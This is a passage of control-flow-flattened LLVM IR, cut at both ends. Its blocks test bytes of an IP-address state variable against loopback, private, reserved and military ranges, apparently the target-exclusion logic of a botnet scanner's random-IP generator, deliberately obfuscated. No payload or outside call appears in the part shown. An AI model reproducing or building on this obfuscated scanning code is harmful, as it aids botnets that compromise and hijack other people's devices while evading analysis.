    i32 -534331498, label %864
    i32 656329951, label %869
    i32 184637515, label %874
    i32 -2092549546, label %879
    i32 1706108356, label %884
    i32 1854569094, label %889
    i32 -2008949446, label %894
    i32 502502159, label %899
    i32 -628848893, label %904
    i32 74452708, label %909
    i32 -753568895, label %914
    i32 -1776728772, label %919
    i32 -653705668, label %924
    i32 2105997877, label %929
    i32 -1959505849, label %934
    i32 -1452309320, label %939
    i32 539463553, label %944
    i32 46509142, label %949
    i32 738089890, label %954
    i32 -1495411028, label %959
    i32 -284016517, label %964
    i32 -1296082312, label %969
    i32 1739213025, label %974
    i32 1860928241, label %979
    i32 108579916, label %984
    i32 881342448, label %989
    i32 114372406, label %994
    i32 -1388470799, label %999
    i32 1913268845, label %1004
    i32 759984039, label %1009
    i32 -2052565400, label %1014
    i32 1814615750, label %1019
    i32 -4709455, label %1024
    i32 -1776513339, label %1029
    i32 1412313664, label %1034
    i32 -147126302, label %1039
    i32 -287659605, label %1044
    i32 1701365911, label %1049
    i32 1319521650, label %1054
    i32 -1976421011, label %1059
    i32 -1122909727, label %1064
    i32 -1411223462, label %1069
    i32 -983323951, label %1074
    i32 628309816, label %1079
    i32 883600631, label %1084
    i32 -533777114, label %1089
    i32 -1251895845, label %1094
    i32 -115655256, label %1099
    i32 -304737023, label %1104
    i32 2116076994, label %1109
    i32 173408786, label %1114
    i32 -1761429237, label %1119
    i32 -705946399, label %1124
    i32 -486221456, label %1129
    i32 -875696944, label %1134
    i32 1828008340, label %1139
    i32 -1809998463, label %1144
    i32 -1873538394, label %1149
    i32 1079972815, label %1154
    i32 1209041077, label %1159
    i32 30022712, label %1164
    i32 1010416355, label %1169
    i32 -731244280, label %1174
    i32 -2135888136, label %1179
    i32 -2045577832, label %1184
    i32 474523298, label %1189
    i32 1203537454, label %1194
    i32 -445102806, label %1199
    i32 -1274249486, label %1204
    i32 -263507504, label %1209
    i32 -486055727, label %1214
    i32 -1904575356, label %1219
    i32 -380393543, label %1224
    i32 -1032226186, label %1229
    i32 -2045322435, label %1234
    i32 1586155088, label %1239
    i32 1690116599, label %1244
    i32 -1939109746, label %1249
    i32 -752471685, label %1254
    i32 -1394664013, label %1259
    i32 1757176164, label %1264
    i32 1185894644, label %1269
    i32 1849122939, label %1274
    i32 -2125651257, label %1279
    i32 1969915263, label %1284
    i32 -779956737, label %1289
    i32 1464975735, label %1294
    i32 -800524230, label %1299
    i32 2095014533, label %1304
    i32 -44045216, label %1309
    i32 -298260218, label %1314
    i32 -1494540393, label %1319
    i32 664916710, label %1324
    i32 -1103388547, label %1329
    i32 -717805440, label %1334
    i32 1652267575, label %1339
    i32 -1647182814, label %1344
    i32 38224213, label %1349
    i32 1163992980, label %1354
    i32 -1317957553, label %1359
    i32 691283573, label %1364
    i32 -1327385528, label %1369
    i32 -902004387, label %1374
    i32 -965122475, label %1379
    i32 -1767036477, label %1384
    i32 -744702819, label %1389
    i32 -1140227698, label %1394
    i32 -435199163, label %1399
    i32 -1040516172, label %1404
    i32 788159576, label %1409
    i32 830725550, label %1414
    i32 -423772671, label %1419
    i32 -327043017, label %1424
    i32 1702657016, label %1429
    i32 1984906311, label %1434
    i32 1357905022, label %1439
    i32 -552228615, label %1444
    i32 -1136152305, label %1449
    i32 1363143455, label %1454
    i32 -1932833625, label %1459
    i32 1321848837, label %1464
    i32 -375103864, label %1469
    i32 -11073439, label %1474
    i32 -1230743145, label %1479
    i32 1605081818, label %1484
    i32 1597365132, label %1489
    i32 1102379008, label %1494
    i32 1537597215, label %1499
    i32 1131522707, label %1504
    i32 -965013109, label %1509
    i32 1417057381, label %1514
    i32 651874224, label %1519
    i32 292132852, label %1524
    i32 -1186976762, label %1529
    i32 1023038012, label %1534
    i32 224866705, label %1539
    i32 69745622, label %1544
    i32 -1474839836, label %1549
    i32 -1202715890, label %1554
    i32 1113754721, label %1559
    i32 485816814, label %1564
    i32 -1220165055, label %1569
    i32 -199339232, label %1574
    i32 -371706397, label %1579
    i32 1667850261, label %1584
    i32 -1278434776, label %1589
    i32 324766, label %1594
    i32 -1951254249, label %1599
    i32 -949999897, label %1604
    i32 -2006187687, label %1609
    i32 -218317690, label %1614
    i32 -1441175830, label %1619
    i32 1991917107, label %1624
    i32 -191344941, label %1629
    i32 1204136542, label %1634
    i32 1950730798, label %1639
    i32 1467084835, label %1644
    i32 -1058031965, label %1649
    i32 -584864347, label %1654
    i32 1365588958, label %1659
    i32 662143930, label %1664
    i32 203215531, label %1669
    i32 1886637277, label %1674
    i32 -610264303, label %1679
    i32 602262521, label %1684
    i32 -2039150006, label %1689
    i32 -759407020, label %1694
    i32 -2031931569, label %1699
    i32 389706211, label %1704
    i32 -242511594, label %1709
    i32 517202191, label %1714
    i32 220691021, label %1719
    i32 -298658719, label %1724
    i32 -157359607, label %1729
    i32 2123132978, label %1734
    i32 -1701397355, label %1739
    i32 539487337, label %1744
    i32 -246908392, label %1749
    i32 1838407379, label %1754
    i32 -46643897, label %1759
    i32 1719155527, label %1764
    i32 -1166839056, label %1769
    i32 828027474, label %1774
    i32 -172718762, label %1779
    i32 1316766719, label %1784
    i32 1238664149, label %1789
    i32 1076696581, label %1794
    i32 -1135455452, label %1799
    i32 66930239, label %1804
    i32 -119354522, label %1809
    i32 -62005228, label %1814
    i32 183961182, label %1819
    i32 2121048409, label %1824
    i32 2043751555, label %1829
    i32 714639687, label %1834
    i32 -1327528136, label %1839
    i32 1080367629, label %1844
    i32 -1151428489, label %1849
    i32 1888495187, label %1854
    i32 -1081454691, label %1859
    i32 556505407, label %1864
    i32 85084154, label %1869
    i32 1488742240, label %1874
    i32 -1071269603, label %1879
    i32 -1613005230, label %1884
    i32 -1042856458, label %1889
    i32 1835193200, label %1894
    i32 280070049, label %1899
    i32 1822862343, label %1904
    i32 1419716942, label %1909
    i32 -1130648870, label %1914
    i32 -670760030, label %1919
    i32 1245253838, label %1924
    i32 1425296817, label %1929
    i32 -757026027, label %1934
    i32 2121691743, label %1939
    i32 -966217752, label %1944
    i32 -912658415, label %1949
    i32 -147949531, label %1954
    i32 1711183015, label %1959
    i32 1851147626, label %1964
    i32 1349110085, label %1969
    i32 -1795989441, label %1974
    i32 1072848341, label %1979
    i32 1323545758, label %1984
    i32 -534198231, label %1989
    i32 -1667152669, label %1994
    i32 37594856, label %1999
    i32 -2072078251, label %2004
    i32 -274406320, label %2009
    i32 -1756695219, label %2014
    i32 -1555111840, label %2019
    i32 2066979053, label %2024
    i32 -1217490291, label %2029
    i32 2000133939, label %2034
    i32 32204202, label %2039
    i32 -1018609672, label %2044
    i32 -1445703860, label %2049
    i32 -609484135, label %2054
    i32 910097926, label %2059
    i32 -118538507, label %2064
    i32 -35504150, label %2069
    i32 978665292, label %2074
    i32 -1829039742, label %2079
    i32 -440930298, label %2084
    i32 1423455859, label %2089
    i32 -1619060005, label %2094
    i32 -2097800817, label %2099
    i32 -2139421161, label %2104
    i32 -1820017350, label %2109
    i32 -1960865238, label %2114
    i32 8318746, label %2119
    i32 1584973934, label %2124
    i32 -1440434531, label %2129
    i32 -507756346, label %2134
    i32 2049132555, label %2139
    i32 -2135918167, label %2144
    i32 -423931157, label %2149
    i32 -1049256539, label %2154
    i32 541732464, label %2159
    i32 -1823952307, label %2164
    i32 116686275, label %2169
    i32 1546228228, label %2174
    i32 -1187470141, label %2179
    i32 1565787920, label %2184
    i32 1687761580, label %2189
    i32 196961582, label %2194
    i32 -1430897647, label %2199
    i32 1846922924, label %2204
    i32 -1966993921, label %2209
    i32 1316147831, label %2214
    i32 1610626485, label %2219
    i32 -340229081, label %2224
    i32 -1769622445, label %2229
    i32 -2048493168, label %2234
    i32 -1217617695, label %2239
    i32 -733810581, label %2244
    i32 307894731, label %2249
    i32 1734011775, label %2254
    i32 -696277503, label %2259
    i32 -1454191497, label %2264
    i32 1403516599, label %2269
    i32 -600929733, label %2274
    i32 -3594836, label %2279
    i32 -2134624835, label %2284
    i32 1451148702, label %2289
    i32 1209542726, label %2294
    i32 223475622, label %2299
    i32 -409899032, label %2304
    i32 799709604, label %2309
    i32 -1262083526, label %2314
    i32 -501378514, label %2319
    i32 -375978761, label %2324
    i32 829110966, label %2329
    i32 2111953819, label %2334
    i32 387412674, label %2339
    i32 1599445615, label %2344
    i32 -2117533357, label %2349
    i32 1166655650, label %2354
    i32 1876474646, label %2359
    i32 -501755829, label %2364
    i32 864579874, label %2369
    i32 614034241, label %2374
    i32 1909435926, label %2379
    i32 1733620159, label %2384
    i32 507830579, label %2389
    i32 1108135513, label %2394
    i32 -1710933011, label %2399
    i32 -856281815, label %2404
    i32 1667317108, label %2409
    i32 1301939047, label %2414
    i32 1383024232, label %2419
    i32 -2111726846, label %2424
    i32 -2145965761, label %2429
    i32 210699400, label %2434
    i32 1721143117, label %2439
    i32 984224837, label %2444
    i32 -1095244921, label %2449
    i32 -25928155, label %2454
    i32 -1236947685, label %2459
    i32 -1387064157, label %2464
    i32 659263239, label %2469
    i32 1085889764, label %2474
    i32 1974359221, label %2479
    i32 324794200, label %2484
    i32 -1293943700, label %2489
    i32 94427311, label %2494
    i32 -1856916229, label %2499
    i32 1506945336, label %2504
    i32 437883812, label %2509
    i32 1785949759, label %2514
    i32 -1904761231, label %2519
    i32 970850461, label %2524
    i32 391488696, label %2529
    i32 409996118, label %2534
    i32 -465261213, label %2539
    i32 -809227982, label %2544
    i32 -734591421, label %2549
    i32 -785732460, label %2554
    i32 -213188855, label %2559
    i32 -40970527, label %2564
    i32 -1598958258, label %2569
    i32 1781108717, label %2574
    i32 494916618, label %2579
    i32 503183041, label %2584
    i32 -2074058163, label %2589
    i32 -1188547272, label %2594
    i32 1444566182, label %2599
    i32 871584568, label %2604
    i32 1820931261, label %2609
    i32 -2023636276, label %2614
    i32 323296982, label %2619
    i32 1395046445, label %2624
    i32 -1011085733, label %2629
    i32 843285505, label %2634
    i32 -1363542903, label %2639
    i32 -996195249, label %2644
    i32 -651551348, label %2649
    i32 -2106984131, label %2654
    i32 -147541415, label %2659
    i32 1559369942, label %2664
    i32 -75947670, label %2669
    i32 -888473219, label %2674
    i32 -318161342, label %2679
    i32 2104312144, label %2684
    i32 -757875517, label %2689
    i32 608336775, label %2694
    i32 1009109019, label %2699
    i32 1019487287, label %2704
    i32 -1069145742, label %2709
    i32 494798523, label %2714
    i32 1875162138, label %2719
    i32 1701856032, label %2724
    i32 1058626026, label %2729
    i32 1875050175, label %2734
    i32 -1946245656, label %2739
    i32 468471149, label %2744
    i32 1297363509, label %2749
    i32 1680278751, label %2754
    i32 391546507, label %2759
    i32 -1107249406, label %2764
    i32 761121227, label %2769
    i32 1037856345, label %2774
    i32 656331145, label %2779
    i32 -703488466, label %2784
    i32 -1838962969, label %2789
    i32 1582490534, label %2794
    i32 610799478, label %2799
    i32 -404272206, label %2804
    i32 -581436702, label %2809
    i32 504586432, label %2814
    i32 -2055249202, label %2819
    i32 211457618, label %2824
    i32 406854877, label %2829
    i32 803985072, label %2834
    i32 -1362406930, label %2839
    i32 -822104944, label %2844
    i32 -954562412, label %2849
    i32 1134612447, label %2854
    i32 -1172261271, label %2859
    i32 2073193546, label %2864
    i32 -2096962310, label %2869
    i32 -622303161, label %2874
    i32 -41480505, label %2879
    i32 963518571, label %2884
    i32 55750726, label %2889
    i32 -782803863, label %2894
    i32 -886816699, label %2898
    i32 466363517, label %2900
    i32 -1931424752, label %2913
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  %18 = select i1 %17, i32 -886816699, i32 -153607722
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 0
  %23 = select i1 %22, i32 -886816699, i32 1362428012
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 3
  %28 = select i1 %27, i32 -886816699, i32 2046317142
  store i32 %28, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 15
  %33 = select i1 %32, i32 -886816699, i32 1871276878
  store i32 %33, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  %38 = select i1 %37, i32 -886816699, i32 129828001
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 10
  %43 = select i1 %42, i32 -886816699, i32 -426260211
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 25
  %48 = select i1 %47, i32 -886816699, i32 -1407965405
  store i32 %48, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 49
  %53 = select i1 %52, i32 -886816699, i32 -128685620
  store i32 %53, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 50
  %58 = select i1 %57, i32 -886816699, i32 677541354
  store i32 %58, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 137
  %63 = select i1 %62, i32 -886816699, i32 -946656272
  store i32 %63, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 6
  %68 = select i1 %67, i32 -886816699, i32 -252552997
  store i32 %68, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 7
  %73 = select i1 %72, i32 -886816699, i32 -1756766829
  store i32 %73, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 11
  %78 = select i1 %77, i32 -886816699, i32 -1608867481
  store i32 %78, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 21
  %83 = select i1 %82, i32 -886816699, i32 1641754335
  store i32 %83, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 22
  %88 = select i1 %87, i32 -886816699, i32 -158090497
  store i32 %88, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 26
  %93 = select i1 %92, i32 -886816699, i32 -1426769912
  store i32 %93, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 28
  %98 = select i1 %97, i32 -886816699, i32 -364048295
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 29
  %103 = select i1 %102, i32 -886816699, i32 -1319406081
  store i32 %103, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 30
  %108 = select i1 %107, i32 -886816699, i32 -1840346017
  store i32 %108, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 33
  %113 = select i1 %112, i32 -886816699, i32 -2082982414
  store i32 %113, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 55
  %118 = select i1 %117, i32 -886816699, i32 -202331253
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 214
  %123 = select i1 %122, i32 -886816699, i32 -1791153457
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 215
  %128 = select i1 %127, i32 -886816699, i32 -581271482
  store i32 %128, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 192
  %133 = select i1 %132, i32 -1698291589, i32 775580994
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 168
  %138 = select i1 %137, i32 -886816699, i32 775580994
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 146
  %143 = select i1 %142, i32 -820774542, i32 1307193967
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 17
  %148 = select i1 %147, i32 -886816699, i32 1307193967
  store i32 %148, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 146
  %153 = select i1 %152, i32 -474191136, i32 1618105326
  store i32 %153, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 80
  %158 = select i1 %157, i32 -886816699, i32 1618105326
  store i32 %158, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 146
  %163 = select i1 %162, i32 -1874675667, i32 2129366538
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 98
  %168 = select i1 %167, i32 -886816699, i32 2129366538
  store i32 %168, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 146
  %173 = select i1 %172, i32 835469971, i32 -1940529899
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 154
  %178 = select i1 %177, i32 -886816699, i32 -1940529899
  store i32 %178, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 147
  %183 = select i1 %182, i32 629741033, i32 -1942364311
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %186 = zext i8 %185 to i32
  %187 = icmp eq i32 %186, 159
  %188 = select i1 %187, i32 -886816699, i32 -1942364311
  store i32 %188, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 148
  %193 = select i1 %192, i32 1851287275, i32 -2106091420
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 114
  %198 = select i1 %197, i32 -886816699, i32 -2106091420
  store i32 %198, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 150
  %203 = select i1 %202, i32 -1284318048, i32 642472940
  store i32 %203, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  %205 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 125
  %208 = select i1 %207, i32 -886816699, i32 642472940
  store i32 %208, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 150
  %213 = select i1 %212, i32 1514902116, i32 -1754803896
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 133
  %218 = select i1 %217, i32 -886816699, i32 -1754803896
  store i32 %218, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 150
  %223 = select i1 %222, i32 261616130, i32 1675940507
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 144
  %228 = select i1 %227, i32 -886816699, i32 1675940507
  store i32 %228, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %231 = zext i8 %230 to i32
  %232 = icmp eq i32 %231, 150
  %233 = select i1 %232, i32 -1425331009, i32 -1590067463
  store i32 %233, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 149
  %238 = select i1 %237, i32 -886816699, i32 -1590067463
  store i32 %238, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %241 = zext i8 %240 to i32
  %242 = icmp eq i32 %241, 150
  %243 = select i1 %242, i32 -1914989408, i32 -495063033
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 157
  %248 = select i1 %247, i32 -886816699, i32 -495063033
  store i32 %248, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %251 = zext i8 %250 to i32
  %252 = icmp eq i32 %251, 150
  %253 = select i1 %252, i32 -1003292442, i32 -1393927709
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 184
  %258 = select i1 %257, i32 -886816699, i32 -1393927709
  store i32 %258, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
